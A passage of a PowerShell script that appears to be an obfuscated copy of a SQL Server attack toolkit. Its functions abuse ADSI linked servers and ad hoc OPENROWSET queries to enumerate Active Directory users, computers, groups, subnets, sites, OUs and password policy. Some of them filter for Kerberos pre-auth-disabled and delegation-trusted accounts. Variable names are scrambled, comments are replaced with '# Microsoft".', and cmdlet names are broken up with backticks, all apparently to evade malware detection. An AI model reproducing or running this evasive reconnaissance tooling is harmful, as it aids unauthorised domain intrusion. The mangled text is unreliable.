                        Write-Verbose -Message "$Instance : Executing in AdHoc mode using OpenRowSet as '$SmokePushy'."
                    }
                }
            }
        }else{
            If (-not($RaggedQuill)){
                Write-Verbose -Message "$Instance : Executing in Link mode using OpenQuery."
            }
        }

        # Microsoft".
        if(-not $PetsIcy){

            # Microsoft".
            $CutDusty = (-join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_}))                                

            # Microsoft".
            If (-not($RaggedQuill)){
                Write-Verbose -Message "$Instance : Creating ADSI SQL Server link named $CutDusty."
            }

            # Microsoft".
            $MatureSpooky = "
            
            -- Create SQL Server link to ADSI
            IF (SELECT count(*) FROM master..sysservers WHERE srvname = '$CutDusty') = 0
	            EXEC master.dbo.sp_addlinkedserver @server = N'$CutDusty', 
	            @srvproduct=N'Active Directory Service Interfaces', 
	            @provider=N'ADSDSOObject', 
	            @datasrc=N'adsdatasource'
                
            ELSE
	            SELECT 'The target SQL Server link already exists.'"

            # Microsoft".
            $NeatIgnore = Get-SQLQuery -Instance $Instance -BoringLarge $MatureSpooky -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RuralRing
           
            # Microsoft".
            if(($SmokePushy) -and ($LyingBells)){

                # Microsoft".
                If (-not($RaggedQuill)){
                    Write-Verbose -Message "$Instance : Associating login '$SmokePushy' with ADSI SQL Server link named $CutDusty."
                }

                $AbaftSleepy = "

                EXEC sp_addlinkedsrvlogin 
                @rmtsrvname=N'$CutDusty',
                @useself=N'False',
                @locallogin=NULL,
                @rmtuser=N'$SmokePushy',
                @rmtpassword=N'$LyingBells'"                                           

            }else{

                # Microsoft".
                If (-not($RaggedQuill)){
                    Write-Verbose -Message "$Instance : Associating '$KillCopy' with ADSI SQL Server link named $CutDusty."
                }

                $AbaftSleepy = "
                -- Current User Context
                -- Notes: testing tbd, sql login (non sysadmin), sql login (sysadmin), windows login (nonsysadmin), windows login (sysadmin), - test passthru and provided creds 
                EXEC sp_addlinkedsrvlogin 
                @rmtsrvname=N'$CutDusty',
                @useself=N'True',
                @locallogin=NULL,
                @rmtuser=NULL,
                @rmtpassword=NULL"
            }                                

            # Microsoft".
            Get-SQLQuery -Instance $Instance -BoringLarge $AbaftSleepy -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill 

        }        

        # Microsoft".
        if($PetsIcy){
            
            # Microsoft".
            $BubbleListen = Get-SQLQuery -Instance $Instance -BoringLarge "SELECT value_in_use FROM master.sys.configurations WHERE name like 'show advanced options'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object value_in_use -ExpandProperty value_in_use
            $TownIce = Get-SQLQuery -Instance $Instance -BoringLarge "SELECT value_in_use FROM master.sys.configurations WHERE name like 'Ad Hoc Distributed Queries'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object value_in_use -ExpandProperty value_in_use

            # Microsoft".
            if($BubbleListen -eq 0){
                
                # Microsoft".
                Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options',1;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill                  

                # Microsoft".
                If (-not($RaggedQuill)){
                    Write-Verbose -Message "$Instance : Enabling 'Show Advanced Options'"
                }
            }else{
                If (-not($RaggedQuill)){
                    Write-Verbose -Message "$Instance : 'Show Advanced Options' is already enabled"
                }
            }

            # Microsoft".
            if($TownIce -eq 0){               

                # Microsoft".
                Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill                

                # Microsoft".
                If (-not($RaggedQuill)){
                    Write-Verbose -Message "$Instance : Enabling 'Ad Hoc Distributed Queries'"
                }
            }else{
                If (-not($RaggedQuill)){
                    Write-Verbose -Message "$Instance : 'Ad Hoc Distributed Queries' are already enabled"
                }
            }
        }

        # Microsoft".
        if($PetsIcy){

            # Microsoft".
            if(($SmokePushy) -and ($LyingBells)){
                $TawdryWorm = "User ID=$SmokePushy; Password=$LyingBells;"                
            }else{
                $TawdryWorm = "adsdatasource" 
            }

            # Microsoft".
            $BoringLarge = "
            -- Run with credential in syntax option 1 - works as sa
            SELECT *
            FROM OPENROWSET('ADSDSOOBJECT','$TawdryWorm',
            '<LDAP://$FuelExist>;$SinStitch;$LowlyBoil;subtree')"
        }else{

            # Microsoft".
            $BoringLarge  = "SELECT * FROM OpenQuery($CutDusty,'<LDAP://$FuelExist>;$SinStitch;$LowlyBoil;subtree')"                 
        }                        
        
        # Microsoft".
        # Microsoft".
            
        # Microsoft".
        If (-not($RaggedQuill)){
            Write-Verbose -Message "$Instance : LDAP query against logon server using ADSI OLEDB started..."
        }        

        # Microsoft".
        $TradeSpicy = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential

        # Microsoft".
        $JoyousRisk += $TradeSpicy         
        
        # Microsoft".
        if(-not $PetsIcy){
            
            # Microsoft".
            If (-not($RaggedQuill)){
                Write-Verbose -Message "$Instance : Removing ADSI SQL Server link named $CutDusty"
            }

            # Microsoft".
            $BrushShrug = "EXEC master.dbo.sp_dropserver @server=N'$CutDusty', @droplogins='droplogins'"

            # Microsoft".
            $ShrugBeg = Get-SQLQuery -Instance $Instance -BoringLarge $BrushShrug -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        }

        # Microsoft".
        if($PetsIcy){
            
            # Microsoft".
            If (-not($RaggedQuill)){
                Write-Verbose -Message "$Instance : Restoring AdHoc settings if needed."
            }
            
            # Microsoft".
            Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Ad Hoc Distributed Queries',$TownIce;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill        

            # Microsoft".
            Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options',$BubbleListen;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill              
        }

        # Microsoft".
        If (-not($RaggedQuill)){
            Write-Verbose -Message "$Instance : LDAP query against logon server using ADSI OLEDB complete."
        } 
    }

    End
    {
        # Microsoft".
        $FemaleRipe = $JoyousRisk.Row.count

        # Microsoft".
        If (-not($RaggedQuill)){
            Write-Verbose -Message "$Instance : $FemaleRipe records were found."
        } 

        # Microsoft".
        return $JoyousRisk
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLDomainUser
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$SmokePushy,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LyingBells,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$PetsIcy,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Filter users based on state or property settings.')]
        [ValidateSet("All","Enabled","Disabled","Locked","PwNeverExpires","PwNotRequired","PreAuthNotRequired","SmartCardRequired","TrustedForDelegation","TrustedToAuthForDelegation","PwStoredRevEnc")]
        [String]$SnottyFew,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$ListenSharpGaudy,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain user to filter for.')]
        [string]$FitHome,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Only list the users who have not changed their password in the number of days provided.')]
        [Int]$YawnNice,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        if((-not $FitHome)){
            $FitHome = '*'
        }

        # Microsoft".
        if((-not $YawnNice)){
            $LovingStare = ""
        }else{

            # Microsoft".
            $AppearUnit = (Get-Date).AddDays(-$YawnNice).ToFileTime()

            # Microsoft".
            $LovingStare = "(!pwdLastSet>=$AppearUnit)"
        }

        # Microsoft".
        switch ($SnottyFew)
        {
            "All"                         {$SkinJuice = ""} 
            "Enabled"                     {$SkinJuice = "(!userAccountControl:1.2.840.113556.1.4.803:=2)"} 
            "Disabled"                    {$SkinJuice = "(userAccountControl:1.2.840.113556.1.4.803:=2)"} 
            "Locked"                      {$SkinJuice = "(sAMAccountType=805306368)(lockoutTime>0)"}
            "PwNeverExpires"              {$SkinJuice = "(userAccountControl:1.2.840.113556.1.4.803:=65536)"} 
            "PwNotRequired"               {$SkinJuice = "(userAccountControl:1.2.840.113556.1.4.803:=32)"}
            "PwStoredRevEnc"              {$SkinJuice = "(userAccountControl:1.2.840.113556.1.4.803:=128)"}
            "PreAuthNotRequired"          {$SkinJuice = "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"}
            "SmartCardRequired"           {$SkinJuice = "(userAccountControl:1.2.840.113556.1.4.803:=262144)"}
            "TrustedForDelegation"        {$SkinJuice = "(userAccountControl:1.2.840.113556.1.4.803:=524288)"}
            "TrustedToAuthForDelegation"  {$SkinJuice = "(userAccountControl:1.2.840.113556.1.4.803:=16777216)"}
        }
    }

    Process
    {
        # Microsoft".
        if($PetsIcy){
            Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -FuelExist $ListenSharpGaudy -SinStitch "(&(objectCategory=Person)(objectClass=user)$LovingStare(SamAccountName=$FitHome)$SkinJuice)" -LowlyBoil "samaccountname,name,admincount,whencreated,whenchanged,adspath" -PetsIcy            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -FuelExist $ListenSharpGaudy -SinStitch "(&(objectCategory=Person)(objectClass=user)$LovingStare(SamAccountName=$FitHome)$SkinJuice)" -LowlyBoil "samaccountname,name,admincount,whencreated,whenchanged,adspath"          
        }
    }

    End
    {                                       
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLDomainSubnet
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$SmokePushy,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LyingBells,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$PetsIcy,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$ListenSharpGaudy,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
    }

    Process
    {
        # Microsoft".
        if($ListenSharpGaudy)
        {
            $WorryPlane = $ListenSharpGaudy
        }else{
            $WorryPlane = Get-SQLServerInfo -RaggedQuill -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert | Select-Object DomainName -ExpandProperty DomainName
        }
        $LastEight = Get-SQLDomainObject -RaggedQuill -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -FuelExist "$WorryPlane" -SinStitch "(name=$WorryPlane)" -LowlyBoil 'distinguishedname' -PetsIcy | Select-Object distinguishedname -ExpandProperty distinguishedname
        
        # Microsoft".
        if($PetsIcy){
            Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -SinStitch "(objectCategory=subnet)" -FuelExist "$WorryPlane/CN=Sites,CN=Configuration,$LastEight" -LowlyBoil 'name,distinguishedname,siteobject,whencreated,whenchanged,location' -PetsIcy            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -SinStitch "(objectCategory=subnet)" -FuelExist "$WorryPlane/CN=Sites,CN=Configuration,$LastEight" -LowlyBoil 'name,distinguishedname,siteobject,whencreated,whenchanged,location'          
        }
    }

    End
    {
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLDomainSite
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$SmokePushy,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LyingBells,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$PetsIcy,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$ListenSharpGaudy,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
    }

    Process
    {
        # Microsoft".
        if($ListenSharpGaudy)
        {
            $WorryPlane = $ListenSharpGaudy
        }else{
            $WorryPlane = Get-SQLServerInfo -RaggedQuill -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert | Select-Object DomainName -ExpandProperty DomainName
        }
        $LastEight = Get-SQLDomainObject -RaggedQuill -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -FuelExist "$WorryPlane" -SinStitch "(name=$WorryPlane)" -LowlyBoil 'distinguishedname' -PetsIcy | Select-Object distinguishedname -ExpandProperty distinguishedname
        
        # Microsoft".
        if($PetsIcy){
            Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -SinStitch "(objectCategory=site)" -FuelExist "$WorryPlane/CN=Sites,CN=Configuration,$LastEight" -LowlyBoil 'name,distinguishedname,whencreated,whenchanged' -PetsIcy            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -SinStitch "(objectCategory=site)" -FuelExist "$WorryPlane/CN=Sites,CN=Configuration,$LastEight" -LowlyBoil 'name,distinguishedname,whencreated,whenchanged'          
        }
    }

    End
    {
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLDomainComputer
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$SmokePushy,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LyingBells,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain computer to filter for.')]
        [string]$NoteTaste,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$PetsIcy,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$ListenSharpGaudy,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        if((-not $NoteTaste)){
            $NoteTaste = '*'
        }
    }

    Process
    {
        # Microsoft".
        if($PetsIcy){
            Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -FuelExist $ListenSharpGaudy -SinStitch "(&(objectCategory=Computer)(SamAccountName=$NoteTaste))" -LowlyBoil 'samaccountname,dnshostname,operatingsystem,operatingsystemversion,operatingSystemServicePack,whencreated,whenchanged,adspath' -PetsIcy            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -FuelExist $ListenSharpGaudy -SinStitch "(&(objectCategory=Computer)(SamAccountName=$NoteTaste))" -LowlyBoil 'samaccountname,dnshostname,operatingsystem,operatingsystemversion,operatingSystemServicePack,whencreated,whenchanged,adspath'            
        }
    }

    End
    {
    }
}

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLDomainOu
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$SmokePushy,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LyingBells,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$PetsIcy,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$ListenSharpGaudy,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
    }

    Process
    {
        # Microsoft".
        if($PetsIcy){
            Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -FuelExist $ListenSharpGaudy -SinStitch '(objectCategory=organizationalUnit)' -LowlyBoil 'name,distinguishedname,adspath,instancetype,whencreated,whenchanged' -PetsIcy            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -FuelExist $ListenSharpGaudy -SinStitch '(objectCategory=organizationalUnit)' -LowlyBoil 'name,distinguishedname,adspath,instancetype,whencreated,whenchanged'
        }
    }

    End
    {                                           
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLDomainAccountPolicy
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$SmokePushy,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LyingBells,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$PetsIcy,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$ListenSharpGaudy,


        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $NarrowBadge = ne`w`-ob`je`ct System.Data.DataTable 
        $NarrowBadge.Columns.Add("pwdhistorylength") | Out-Null
        $NarrowBadge.Columns.Add("lockoutthreshold") | Out-Null
        $NarrowBadge.Columns.Add("lockoutduration") | Out-Null
        $NarrowBadge.Columns.Add("lockoutobservationwindow") | Out-Null
        $NarrowBadge.Columns.Add("minpwdlength") | Out-Null 
        $NarrowBadge.Columns.Add("minpwdage") | Out-Null
        $NarrowBadge.Columns.Add("pwdproperties") | Out-Null
        $NarrowBadge.Columns.Add("whenchanged") | Out-Null
        $NarrowBadge.Columns.Add("gplink") | Out-Null
    }

    Process
    {
        # Microsoft".
        if($PetsIcy){
            $FlyCruel = Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -FuelExist $ListenSharpGaudy -SinStitch '(objectClass=domainDNS)' -LowlyBoil 'pwdhistorylength,lockoutthreshold,lockoutduration,lockoutobservationwindow,minpwdlength,minpwdage,pwdproperties,whenchanged,gplink' -PetsIcy            
        }else{
            $FlyCruel = Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -FuelExist $ListenSharpGaudy -SinStitch '(objectClass=domainDNS)' -LowlyBoil 'pwdhistorylength,lockoutthreshold,lockoutduration,lockoutobservationwindow,minpwdlength,minpwdage,pwdproperties,whenchanged,gplink'
        }

        $FlyCruel | ForEach-Object {

            # Microsoft".
            $NarrowBadge.Rows.Add(
            $_.pwdHistoryLength,
            $_.lockoutThreshold,
            [string]([string]$_.lockoutDuration -replace '-','') / (60 * 10000000),
            [string]([string]$_.lockOutObservationWindow -replace '-','') / (60 * 10000000),
            $_.minPwdLength,
            [string][Math]::Floor([decimal](((([string]$_.minPwdAge -replace '-','') / (60 * 10000000)/60))/24)),
            [string]$_.pwdProperties,
            [string]$_.whenChanged,
            [string]$_.gPLink 
            ) | Out-Null

        }

        $NarrowBadge
    }

    End
    {                     
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLDomainGroup
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$SmokePushy,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LyingBells,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain group to filter for.')]
        [string]$RiceDead,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$PetsIcy,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$ListenSharpGaudy,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        if((-not $RiceDead)){
            $RiceDead = '*'
        }
    }

    Process
    {
        # Microsoft".
        if($PetsIcy){
            Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -FuelExist $ListenSharpGaudy -SinStitch "(&(objectClass=Group)(SamAccountName=$RiceDead))" -LowlyBoil 'samaccountname,adminCount,whencreated,whenchanged,adspath' -PetsIcy            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -SmokePushy $SmokePushy -LyingBells $LyingBells -FuelExist $ListenSharpGaudy -SinStitch "(&(objectClass=Group)(SamAccountName=$RiceDead))" -LowlyBoil 'samaccountname,adminCount,whencreated,whenchanged,adspath'            
        }
    }

    End
    {               
    }
}

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLDomainTrust
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$SmokePushy,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LyingBells,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

